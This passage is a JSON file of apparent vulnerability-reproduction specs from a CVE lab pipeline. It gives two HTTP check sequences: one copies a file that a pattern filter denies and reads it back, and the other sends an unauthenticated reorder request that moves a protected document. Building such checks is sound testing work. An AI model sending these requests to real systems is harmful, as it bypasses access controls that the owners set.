[
  {
    "from": "baseline-2026-10-29/CVE-2026-103028 (attempted_spec)",
    "spec": {
      "strategy": "direct_observation",
      "transport": "http",
      "observable_effect": "On a target whose file pattern filter on / denies *.dat, copying a denied source to /cvelab_copied.txt succeeds and reading /cvelab_copied.txt back returns 200; a patched build refuses the copy and the read returns 404.",
      "inputs": [
        "basic_auth",
        "source"
      ],
      "auth": {},
      "checks": [
        {
          "label": "spec",
          "discover": [
            {
              "bind": "token",
              "query": [
                {
                  "method": "GET",
                  "path": "/api/v2/user/token",
                  "headers": {
                    "Authorization": "{{basic_auth}}"
                  },
                  "body": null
                }
              ],
              "extract": {
                "json_values": "access_token"
              }
            }
          ],
          "probe": [
            {
              "method": "DELETE",
              "path": "/api/v2/user/files?path=%2Fcvelab_copied.txt",
              "headers": {
                "Authorization": "Bearer {{token}}"
              },
              "body": null
            },
            {
              "method": "POST",
              "path": "/api/v2/user/file-actions/copy?path={{source}}&target=%2Fcvelab_copied.txt",
              "headers": {
                "Authorization": "Bearer {{token}}"
              },
              "body": null
            },
            {
              "method": "GET",
              "path": "/api/v2/user/files?path=%2Fcvelab_copied.txt",
              "headers": {
                "Authorization": "Bearer {{token}}"
              },
              "body": null
            }
          ],
          "expect": {
            "status": 200
          }
        }
      ],
      "health_timeout": 120
    }
  },
  {
    "from": "batch10-2026-10-28/CVE-2026-105859 (attempted_spec)",
    "spec": {
      "strategy": "direct_observation",
      "transport": "http",
      "observable_effect": "An unauthenticated POST /api/reorder naming a document titled Fixed position, which the collection update access forbids, is accepted with HTTP 200 on an instance whose orderable collection has update access excluding that title.",
      "inputs": [],
      "auth": {},
      "checks": [
        {
          "label": "spec",
          "discover": [
            {
              "bind": "fixed_id",
              "query": [
                {
                  "method": "GET",
                  "path": "/api/orderable?where[title][equals]=Fixed%20position&depth=0",
                  "headers": {},
                  "body": null
                }
              ],
              "extract": {
                "json_values": "id"
              }
            },
            {
              "bind": "target_id",
              "query": [
                {
                  "method": "GET",
                  "path": "/api/orderable?where[title][not_equals]=Fixed%20position&limit=1&depth=0",
                  "headers": {},
                  "body": null
                }
              ],
              "extract": {
                "json_values": "id"
              }
            },
            {
              "bind": "target_key",
              "query": [
                {
                  "method": "GET",
                  "path": "/api/orderable?where[title][not_equals]=Fixed%20position&limit=1&depth=0",
                  "headers": {},
                  "body": null
                }
              ],
              "extract": {
                "json_values": "_order"
              }
            }
          ],
          "probe": [
            {
              "method": "POST",
              "path": "/api/reorder",
              "headers": {
                "Content-Type": "application/json"
              },
              "body": "{\"collectionSlug\": \"orderable\", \"docsToMove\": [\"{{fixed_id}}\"], \"newKeyWillBe\": \"greater\", \"orderableFieldName\": \"_order\", \"target\": {\"id\": \"{{target_id}}\", \"key\": \"{{target_key}}\"}}"
            }
          ],
          "expect": {
            "status": 200
          }
        }
      ],
      "setup": [
        {
          "method": "POST",
          "path": "/lab/seed",
          "headers": {},
          "body": null
        }
      ],
      "health_timeout": 120
    }
  },
